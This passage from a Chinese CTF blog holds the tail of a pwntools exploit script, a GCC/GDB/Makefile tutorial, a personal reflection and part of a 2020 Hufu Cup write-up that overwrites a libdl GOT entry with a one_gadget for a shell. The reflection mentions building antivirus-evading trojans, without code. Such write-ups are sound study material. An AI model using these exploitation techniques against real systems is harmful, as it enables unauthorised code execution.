class="number">0x4f3c2</span></span><br><span class="line">	sa(<span class="string">&#x27;QAQ\n&#x27;</span>, p64(target - <span class="number">0x60</span>))</span><br><span class="line">	db()</span><br><span class="line">	mv(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/01/wp-2020-qwb/" data-id="ckhemv81s002fwdcm2cbbd4tu" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-linux-compiler" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/01/linux-compiler/" class="article-date">
  <time datetime="2020-09-01T03:45:16.000Z" itemprop="datePublished">2020-09-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/dev/">dev</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/01/linux-compiler/">linux-complier</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>a.c -&gt;预处理-&gt; a.i -&gt;汇编-&gt; a.s -&gt;编译-&gt; a.o -&gt;链接-&gt; a.out<br>gcc -E -o a.i a.c (预处理)<br>gcc -S -o a.s a.i (编译)<br>gcc -c -o a.o a.s (汇编)<br>gcc -o a.out a.o  (链接)</p>
<p>后辍文件详解:<br>&lt; .c &gt; C语言源码文件<br>&lt; .a &gt; 目标文件构成的库文件<br>&lt; .C / .cc /.cxx &gt; C++ 源码文件<br>&lt; .h &gt; 头文件<br>&lt; .o &gt; 编译后的目标文件<br>&lt; .s &gt; 是汇编语言源代码文件</p>
<p>编译选项:<br>&lt; -o file_name &gt;  指定输出文件<br>&lt; -O &gt;  对程序进行优化编译,链接<br>&lt; -O2 &gt; 对程序进行更好的优化编译,链接<br>&lt; -O3 &gt; 最佳优化<br>&lt; -g &gt;  对程序加入调试 (gdb 调试)<br>&lt; -I dir_name &gt;  将所指出的目录作为编译器寻找头文件的路径<br>&lt; -Wall &gt; 生成所有警告信息<br>&lt; -w &gt;    不生成任何警告信息</p>
<p>&lt;  -D/-DMACRO &gt; 定义MACRO宏，等效于在程序中使用#define MACRO</p>
<p>(应用场景:可以控制debug的输出)</p>
<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>layout asm —汇编界面<br>b *addr<br>        查看内存命<br>可以使用examine命令(简写是x)来查看内存地址中的值。x命令的语法如下所示：<br>x/&lt;n/f/u&gt; <addr><br>n、f、u是可选的参数。<br>n是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义。<br>f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是s，如果地十是指令地址，那么格式可以是i。<br>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。<br>当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。<br><addr>表示一个内存地址。<br>注意：严格区分n和u的关系，n表示单元个数，u表示每个单元的大小。<br>n/f/u三个参数可以一起使用。例如：<br>命令：x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按十六进制显示。<br>输出格式<br>一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。<br>例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。<br>要做到这样，你可以使用GDB的数据显示格式：</p>
<p>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。</p>
<p>f 按浮点数格式显示变量。</p>
<h3 id="静态库"><a href="#静态库" class="headerlink" title="静态库"></a>静态库</h3><p>  1.命名规则:<br>    lib+库名+.a<br>  2.制作静态库:<br>     生成对应的.o文件  .c—&gt; .o     (gcc -c a.c b.c c.c ….)<br>      将生成的.a文件打包 ar rcs 生成静态库名 lib1.o lib2.o ….. (ar src liblogan.a ./*.o)<br>  3.发布和使用静态库:<br>    1发布静态库: 把头文件移动到include里,把.a文件移动到lib里<br>    2头文件<br>  4.使用接口:<br>    1源文件里导入头文件,gcc main.c -I ./include lib/lib.a (后面导入lib文件)  (把main.c 放第一位)<br>      2正式用法: gcc main.c -Iinclude -L lib -l logan -o run  (logan 去头去尾: liblogan.a)<br>    -I 指定头文件路径    (可以无空格)<br>    -L 指定lib目录<br>    -l 指定lib目录下的lib文件<br>  5.查看静态库文件:<br>    nm lib.a  (nm 还可以查看.out .o)<br>    nm 里<br>    T 代表代码区<br>    B b D W t r<br>  6.缺点:<br>    1若使用静态库里的某一个函数,则编译时会将整个.o文件连接到可执行文件中,占用空间(以.o文件为单位)<br>    2库文件发生改变,需重新编译<br>  7.优点:<br>    1发布程序的时候，不需要提供对应的库</p>
<p>​    2Load程序的时候，速度快</p>
<h3 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h3><p>  1.命名规则:<br>    lib+库名+.so<br>  2.制作共享库:<br>    1生成与位置无关的.o  (gcc -fPIC -c <em>.c)<br>    2将.o打包成共享库(动态库) (gcc -shared -o liblogan.so ./</em>.o)<br>  3.发布和使用共享库:<br>    1发布共享库: 把.so文件移动到lib里<br>    2使用共享库:<br>       在编译目标代码时只需导入动态链接库就可以使用(单个)<br>       一*  gcc main.c  lib/libprint.so -o run</p>
<p>使用:(gcc main.c -L lib -l print -o run)会导致在运行时无法链接<br>需使用以下方法进行链接</p>
<pre><code>1*使用环境变量来导入lib.so
echo $LD_LIBRARY_PATH
export LD_LIBRARY_PATH=./lib (临时测试用)

2*修改配置文件来实现永久修改:(永久)(不常用)
vim ~/.bashrc
找到 LD_LIBRARY_PATH=...然后进行修改

3*修改动态链接器的配置文件实现链接lib(永久)
     1-&gt;找到动态链接器的配置文件
    sudo vim /etc/ld.so.conf
     2-&gt;动态路径些到ld.so.conf里
     3-&gt;更新  sudo ldconfig -v
3查看可执行程序的链接库: ldd file  (print share object dependencis)
4动态库的优缺点:
    优点:
    体积小
    更新不需重新编译程序,实现了模块化(函数接口不变的情况下)
    缺点:
    需要把动态库提供给用户
    加载速度相对较慢</code></pre>
<hr>
<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><pre><code>命令:
l ----list 查看源码
  l 10 查看10行
  查看其他文件:
  l a.c:20 表示查看 a.c文件里的20的行内容
  l a.c:function_name 查看 a.c文件里fun函数

b ----breakpoint 下断点
break----------&gt;
条件断点:
b 15 if i==15 表示在15行变量i=15时停下
查看断点信息:
i b-------information of break
info break----&gt;
d----删除断点
info break

p ----print 打印
print------&gt;

ptype----查看变量类型

diplay----display----追踪变量(循环里可运用)
undisplay----去掉追踪变量的值
用之前需获取变量ID
使用 info display 获取
然后 undisplay var_ID

r ----run运行
start------&gt;
vmmap ----查看内存分布
n----单布调试(绕过函数体)
c----继续执行(遇到断点停下)
s----(单步)(可进入函数体)
u----跳出单次循环
finish----跳出当前进入的函数</code></pre>
<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><h3 id="Makefile规则"><a href="#Makefile规则" class="headerlink" title="Makefile规则"></a>Makefile规则</h3><pre><code>TARGET....: DEPENDEDS...
COMMAND
...
...
在执行动作命令之前会判断所DEPENDEDS条件是满足,若不满足,则执行依赖项
clean规则会执行 -$(RM)$(TARGET)$(OBJS)命令
clean用于清除中间生成文件

注意:COMMAND之前必须有TAB键，不能使用空格来代替

make命令执行的时候会根据文件的时间搓来判断是否执行相关的命令</code></pre>
<h3 id="匹配模式"><a href="#匹配模式" class="headerlink" title="匹配模式"></a>匹配模式</h3><p>例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main.o:main.c add&#x2F;add.h sub&#x2F;sub.h</span><br><span class="line">	gcc -c -o main.o main.c -Iadd -Isub</span><br></pre></td></tr></table></figure>

<p>简便方法实现相同功能:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main.o:%o:%c</span><br><span class="line">	gcc -c$&lt; -o $@</span><br></pre></td></tr></table></figure>

<p>%o:%c表示将TARGET域的.o拓展名替换为.c,即main.o 替换为main.c.<br>$&lt;表示依赖项的结果,即main.c<br>$@表示TARGET域的名称,即 main.o</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h3><p>$(wildcard ./*.c)  —获取./下的所有.c文件<br>$(patsubst %.o,%.c,a.o) —将.o替换为.c</p>
<p>!在命令前加’-‘,若命令执行失败,则忽略该命令,继续往下执行.</p>
<h3 id="若在当前目录下存在一个’clean’文件-则就无法使用make-clean来实现清除的目的"><a href="#若在当前目录下存在一个’clean’文件-则就无法使用make-clean来实现清除的目的" class="headerlink" title="若在当前目录下存在一个’clean’文件,则就无法使用make clean来实现清除的目的"></a>若在当前目录下存在一个’clean’文件,则就无法使用make clean来实现清除的目的</h3><p>需要在Makefile中声明伪目标.<br>具体实现:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.PHONY:clean</span><br><span class="line">	clean:</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/01/linux-compiler/" data-id="ckhemv80e000qwdcm5di56o1b" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dev/" rel="tag">dev</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-life-target-0" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/18/life-target-0/" class="article-date">
  <time datetime="2020-06-18T04:13:09.000Z" itemprop="datePublished">2020-06-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/life/">life</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/18/life-target-0/">life-target-0</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="我的感悟"><a href="#我的感悟" class="headerlink" title="我的感悟"></a>我的感悟</h2><p>进入大学后,就一直随风漂流,感觉眼前一切都很迷茫,看不到未来, 日复一日, 都是昏沉中度过.也没有以前那中动力了,也许是没有定好一个目标,没有好好规划自己.时间在浪费,而且自己还在倒退。上学期,一晃而过,自己没有什么收获,同学们都在进步中成长,我看到了他们的努力,我也看到了他们的收获。我英语好久没学,差点挂掉,可悲.自己在软工呆不了就转来信息安全,转来的目的就只是能好好与d0g3的队友们一起好好交流与打ctf.其实我自己当初的愿望就是想做游戏开发,高中做了一些很基础的游戏,然后接触到安全就没再搞过游戏开发了.那时打算以后去北京发展,报了天津工业大学的软工,一分只差让我就与之相别.来的成信大,听说两个很牛的实验一个是syclover,另一个是d0g3,也打了一个月差点放弃的极客大赛,坚持到最后还是的了一个三等奖. 两个实验室的选择,最终还是去了d0g3,我打算想继续开发游戏,可是为了实验室能够继承,我也只好搞安全了.唯独有点收获的就是在12月份的时候,去了西南石油大学打了一场ctf线下赛,被大佬们打得遍体淋伤.但由此我与实验室的同伴们关系增加了不少, 也体会到大佬们是如何的强大. 还有在12末的时候, 做了几个高度伪装免杀一系列木马.拿了10多个人的电脑测验了下,没有一个能杀到. 回到家自己打算好好打ctf,打了两天,就不打了.去学了c++开发,学了两个星期的Qt,做了3个星期的即时通讯软件(Litalk).我把测试视频发布在b站上, 不久就有很多人问我要代码,还有一个人叫我帮他开发即时通讯软件,客户端+ 服务端. 有一个要求是好友之间能够实现文件传输,这个我也没有试过,就大胆的接这个外包来做做.这次开发效率相对较高,客户端架构与服务端架构比较清晰一点,就是文件传输做了3天,tcp与udp协议之间一直在换来换去的.最终还是采用udp协议实现了,有丢包重发机制,测试了一些大文件传输,没有丢包现象,一个星期后提交给他进行测试.得到了一个不错的奖励.但动力持续不久.突然之间感觉课程听不懂了.逃课是常事.每天忘记自己在干嘛了,实验室队友们都在搞安全,我搞开发他们有点不服气,天天叫我打ctf.我就前两个星期开始回归到ctf中,继续研究各种漏洞.花了两个星期研究heap的利用手段.然而在昨天虎符杯比赛中,队友们打得热火朝天,我一直在找利用点,中午的时候官方出了一个简单的题,才把它给做了.比赛结束之后,听了大佬们给的一个思路,才恍然大悟, 自己是太菜了,学习经验不够.现在的做事效率感觉超级低, 也许是自己懒得的原因.我得改变改变自己,找到高中时代的动力.</p>
<h2 id="未来打算"><a href="#未来打算" class="headerlink" title="未来打算"></a>未来打算</h2><h4 id="大一"><a href="#大一" class="headerlink" title="大一"></a>大一</h4><p>大一马上也快结束了,为自己定一个小目标吧,继续打ctf,开发这块,把pwn中的各种漏洞学明白,尽量在大一就学linux kernel漏洞的利用,总之一句话,使劲学pwn, 英语再差,也要试一试四级考试, 早起! 早起! 早起!  改掉懒惰的坏习惯,多背单词, 前个星期, 自己贪玩,玩pbug外服的,碰到三个美国小孩,全程英语,搞得我一脸蒙蔽,不会说, 被他们笑话,He didn’t respond. That’s  stupid~..这有利于我去学英语,好好多练习英语口语. Pick up your gun!,尽量少玩游戏…</p>
<h4 id="大二"><a href="#大二" class="headerlink" title="大二"></a>大二</h4><p>还打算继续打ctf,这是一个关键时期,很多大型比赛的战队都是这一个阶段,把握住此机会,还有把四级给过了,下学期暑假把驾照给考了,作出一点有用的东西</p>
<h4 id="大三"><a href="#大三" class="headerlink" title="大三"></a>大三</h4><p>这时就可以不用太专注于安全了, 若有比赛,能打得奖金就打吧. 这个时候就打算好好做一下开发, 多在github中作出贡献， 继续做我的开源项目liq,跟换通讯协议为http协议进行获取信息, 能够在windows平台linux还有macos分别有相应的客户端,也实现一下web的对应接口服务. 再做一下网络对战游戏,登录帐号就采用liq的请求帐号信息接口,  实现一下简陋类似于腾讯的服务设计理念. 为以后找工作准备.(尽量找游戏公司)</p>
<h4 id="大四"><a href="#大四" class="headerlink" title="大四"></a>大四</h4><p>先在成都找找一些游戏公司,不行的话,去北京或者深圳闯闯, 不要求太高,找到公司先做一段时间,后续在打算.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/06/18/life-target-0/" data-id="ckhemv80a000nwdcm8wlr6sj0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/life/" rel="tag">life</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-hfb-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/18/wp-hfb-2020/" class="article-date">
  <time datetime="2020-06-18T03:36:03.000Z" itemprop="datePublished">2020-06-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/18/wp-hfb-2020/">wp-hfb-2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="虎符杯-2020-pwn"><a href="#虎符杯-2020-pwn" class="headerlink" title="虎符杯-2020-pwn"></a>虎符杯-2020-pwn</h1><h1 id="MarksMan"><a href="#MarksMan" class="headerlink" title="MarksMan"></a>MarksMan</h1><p>World of Attack &amp; Defense</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>2 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>输入一个地址,然后再输入3字节的内容,这三个字节的就写入该地址,开启三个字节的检查机制,防止one_gadget,但是某些one_gadget可以绕过.</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sub_9BA();</span><br><span class="line"> sub_A55();</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Free shooting games! Three bullets available!&quot;</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;I placed the target near: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>); <span class="comment">//泄漏libc</span></span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;shoot!shoot!&quot;</span>);</span><br><span class="line"> v6 = sub_B78();</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;biang!&quot;</span>);</span><br><span class="line">   read(<span class="number">0</span>, &amp;v7[i], <span class="number">1u</span>LL);</span><br><span class="line">   getchar();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_BC2(v7) )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">     *(_BYTE *)(j + v6) = v7[j]; <span class="comment">//覆盖3个字节</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> ( !dlopen(<span class="number">0L</span>L, <span class="number">1</span>) )</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure>



<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>one_gadgt,  libdl.so.2链接</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>同找到libc某个函数的plt,然好找到libdl.so.2中的链接地址, 将该地址修改为one_gadget获得shell</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="找目标地址"><a href="#找目标地址" class="headerlink" title="找目标地址"></a>找目标地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f340b44f730 &lt;_dlerror_run+96&gt;     call   _dl_catch_error@plt &lt;0x7f340b44ed90&gt;</span><br><span class="line">     rdi: 0x7f340b6510f0 (last_result+16) ◂— 0x0</span><br><span class="line">     rsi: 0x7f340b6510f8 (last_result+24) ◂— 0x0</span><br><span class="line">     rdx: 0x7f340b6510e8 (last_result+8) ◂— 0x0</span><br><span class="line">     rcx: 0x7f340b44ef40 (dlopen_doit) ◂— push   rbx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass 0x7f340b44ed90</span><br><span class="line">Dump of assembler code for function _dl_catch_error@plt:</span><br><span class="line">   0x00007f340b44ed90 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x2022a2]        # 0x7f340b651038</span><br><span class="line">   0x00007f340b44ed96 &lt;+6&gt;:	push   0x4</span><br><span class="line">   0x00007f340b44ed9b &lt;+11&gt;:	jmp    0x7f340b44ed40</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>进入该地址,该地址里面是libdl.so.2链接器中储存libc.so.6中函数的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;40gx 0x7f340b651038</span><br><span class="line">0x7f340b651038:	0x00007f340b73769f	0x00007f340b44eda6</span><br><span class="line">0x7f340b651048:	0x00007f340b44edb6	0x00007f340b44edc6</span><br><span class="line">0x7f340b651058:	0x00007f340b44edd6	0x00007f340b44ede6</span><br><span class="line">0x7f340b651068:	0x00007f340b44edf6	0x00007f340b44ee06</span><br><span class="line">0x7f340b651078:	0x00007f340b44ee16	0x00007f340b651080</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在继续进入该地址, 可以发现,进入到了libc.so.6地址中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;40gx 0x00007f340b73769f</span><br><span class="line">0x7f340b73769f &lt;execvpe+527&gt;:	0x4c000ce7f43d8d48	0xf77fe8f6894ce289</span><br><span class="line">0x7f340b7376af &lt;execvpe+543&gt;:	0xfe35e9ec894cffff	0x0ce7da058d48ffff</span><br><span class="line">0x7f340b7376bf &lt;execvpe+559&gt;:	0xe58949b0758d4c00	0xb0458948b87d894c</span><br><span class="line">0x7f340b7376cf &lt;execvpe+575&gt;:	0x0000001046c74990	0x00441f0f66c5eb00</span><br><span class="line">0x7f340b7376df &lt;execvpe+591&gt;:	0xee894ca87d8b4800	0x4dd231fff3bb44e8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以我们只需修改libdl.so.2链接器中的储存的地址就行,类似于修改got表,但怎么获取该地址, 由于libdl.so.2紧挨着,直接可以计算该地址.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x55d6904bc000     0x55d6904be000 r-xp     2000 0      &#x2F;home&#x2F;logan&#x2F;share&#x2F;pwn1&#x2F;chall</span><br><span class="line">    0x55d6906bd000     0x55d6906be000 r--p     1000 1000   &#x2F;home&#x2F;logan&#x2F;share&#x2F;pwn1&#x2F;chall</span><br><span class="line">    0x55d6906be000     0x55d6906bf000 rw-p     1000 2000   &#x2F;home&#x2F;logan&#x2F;share&#x2F;pwn1&#x2F;chall</span><br><span class="line">    0x7f340b44e000     0x7f340b451000 r-xp     3000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so</span><br><span class="line">    0x7f340b451000     0x7f340b650000 ---p   1ff000 3000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so</span><br><span class="line">    0x7f340b650000     0x7f340b651000 r--p     1000 2000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so</span><br><span class="line">    0x7f340b651000     0x7f340b652000 rw-p     1000 3000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so</span><br><span class="line">    0x7f340b652000     0x7f340b839000 r-xp   1e7000 0      &#x2F;home&#x2F;logan&#x2F;share&#x2F;pwn1&#x2F;libc.so.6</span><br><span class="line">    0x7f340b839000     0x7f340ba39000 ---p   200000 1e7000 &#x2F;home&#x2F;logan&#x2F;share&#x2F;pwn1&#x2F;libc.so.6</span><br><span class="line">    0x7f340ba39000     0x7f340ba3d000 r--p     4000 1e7000 &#x2F;home&#x2F;logan&#x2F;share&#x2F;pwn1&#x2F;libc.so.6</span><br><span class="line">    0x7f340ba3d000     0x7f340ba3f000 rw-p     2000 1eb000 &#x2F;home&#x2F;logan&#x2F;share&#x2F;pwn1&#x2F;libc.so.6</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="计算该地址"><a href="#计算该地址" class="headerlink" title="计算该地址"></a>计算该地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;near: &#x27;</span>)</span><br><span class="line">lib.address = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - lib.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line">_dl_catch_error_got = lib.address + (<span class="number">0x7f15af376038</span> - <span class="number">0x7f15af377000</span>)</span><br></pre></td></tr></table></figure>



<h3 id="修改该地址为one-gadget"><a href="#修改该地址为one-gadget" class="headerlink" title="修改该地址为one_gadget"></a>修改该地址为one_gadget</h3><p>由于体中开启了金手指</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_BC2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (*a1 != <span class="number">0xC5</span>u || a1[<span class="number">1</span>] != <span class="number">0xF2</span>u) &amp;&amp; (*a1 != <span class="number">0x22</span> || a1[<span class="number">1</span>] != <span class="number">0xF3</span>u) &amp;&amp; *a1 != <span class="number">0x8C</span>u &amp;&amp; a1[<span class="number">1</span>] != <span class="number">0xA3</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You always want a Gold Finger!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认的one_gadget就不能使用了,就需要更多的one_gadget</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 